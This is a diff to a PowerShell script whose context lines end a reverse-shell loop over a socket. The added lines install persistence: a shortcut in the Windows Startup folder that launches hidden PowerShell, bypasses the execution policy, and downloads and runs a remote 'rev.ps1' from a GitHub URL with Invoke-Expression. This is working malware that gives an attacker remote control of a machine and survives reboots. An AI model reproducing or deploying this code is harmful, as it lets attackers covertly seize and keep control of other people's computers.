@@ -17,3 +17,17 @@ do{
 	}
 }While (!$out.equals("exit"))
 $writer.close();$socket.close();
+
+$githubScriptURL = "https://raw.githubusercontent.com/Leefni0/kas/main/rev.ps1"
+$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "RunGitHubScript.lnk"
+if (-not (Test-Path $shortcutPath)) {
+    $shell = New-Object -ComObject WScript.Shell
+    $shortcut = $shell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"Invoke-Expression (New-Object Net.WebClient).DownloadString('$githubScriptURL')`""
+    $shortcut.Save()
+} else {
+    Write-Host "Shortcut already exists in Startup folder."
+}
+
